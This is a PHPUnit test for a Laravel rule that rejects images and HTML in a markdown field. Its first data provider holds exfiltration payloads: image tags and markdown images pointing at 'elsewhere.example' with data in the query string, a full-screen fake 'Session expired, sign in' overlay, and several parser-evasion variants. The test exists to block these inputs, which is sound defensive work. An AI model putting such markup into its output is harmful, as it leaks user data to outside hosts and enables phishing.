<?php

namespace Tests\Feature\Inventory;

use App\Rules\NoImagesOrHtml;
use Illuminate\Support\Facades\Validator;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

class NoImagesOrHtmlTest extends TestCase
{
    /**
     * Every way to load something from elsewhere, or to lay something over
     * the page, that the panel's markdown would render.
     *
     * @return array<string, array{string}>
     */
    public static function imagesAndHtml(): array
    {
        return [
            'image' => ['![status](https://elsewhere.example/x.png?d=secret)'],
            'reference image' => ["![a][1]\n\n[1]: https://elsewhere.example/x.png?d=secret"],
            'protocol-relative image' => ['![a](//elsewhere.example/x.png)'],
            'img tag' => ['<img src="https://elsewhere.example/x.png">'],
            'srcset' => ['<img srcset="https://elsewhere.example/x.png 1x">'],
            'picture' => ["<picture>\n<source srcset=\"https://elsewhere.example/x.png\">\n</picture>"],
            'video poster' => ['<video poster="https://elsewhere.example/x.png"></video>'],
            'styled block' => ['<div style="position:fixed;inset:0">Session expired, <a href="https://elsewhere.example">sign in</a></div>'],
            'inline html' => ['Restart <span style="background:url(https://elsewhere.example/x)">now</span>'],
            // Text on the page, but the markdown editor shows the image while editing.
            'a space in the address' => ['![s](https://elsewhere.example/p.png?d=app-1 db-1)'],
            'an undefined reference' => ['![s][x](https://elsewhere.example/p.png?d=1)'],
            'two titles' => ['![a](https://elsewhere.example/p.png "t" "u")'],
            // A line that starts like an image, inside something else on the page.
            'in a link destination' => ["[x](\n![a](https://elsewhere.example/x.png))"],
            'in a link title' => ["[x](/u \"t\n![a](https://elsewhere.example/x.png) y\")"],
            'in a reference title' => ["[ref]: /u \"t\n![a](https://elsewhere.example/x.png)\nend\""],
            'in a code span in a quote' => ["> ``s\n![a](https://elsewhere.example/x.png)``"],
            'after a carriage return' => ["[x](/u \"t\r![a](https://elsewhere.example/x.png) y\")"],
        ];
    }

    #[DataProvider('imagesAndHtml')]
    public function test_images_and_html_are_refused(string $value): void
    {
        $validator = Validator::make(['plan' => $value], ['plan' => [new NoImagesOrHtml]]);

        $this->assertTrue($validator->fails());
        $this->assertSame('Geen afbeeldingen of HTML: zet tags en placeholders tussen backticks.', $validator->errors()->first('plan'));
    }

    /** @return array<string, array{string}> */
    public static function markdown(): array
    {
        return [
            'a tag in a code span' => ['Edit the `<VirtualHost>` block.'],
            'a fenced block' => ["```\n<img src=\"x\">\n```"],
            'a comparison' => ['Only if a < b and c > d.'],
            'an autolink' => ['See <https://example.com/docs>.'],
            'a link' => ['See [the docs](https://example.com/docs).'],
            'a list with code' => ["1. `apt upgrade`\n2. `systemctl restart php8.5-fpm`"],
            'image syntax in code' => ['Write `![alt](url)` for an image.'],
            'an exclamation' => ['Done! [The log](https://example.com/log) is clean.'],
            'an exclamation before a footnote' => ['Done![1]'],
        ];
    }

    #[DataProvider('markdown')]
    public function test_markdown_without_them_passes(string $value): void
    {
        $this->assertTrue(Validator::make(['plan' => $value], ['plan' => [new NoImagesOrHtml]])->passes());
    }
}
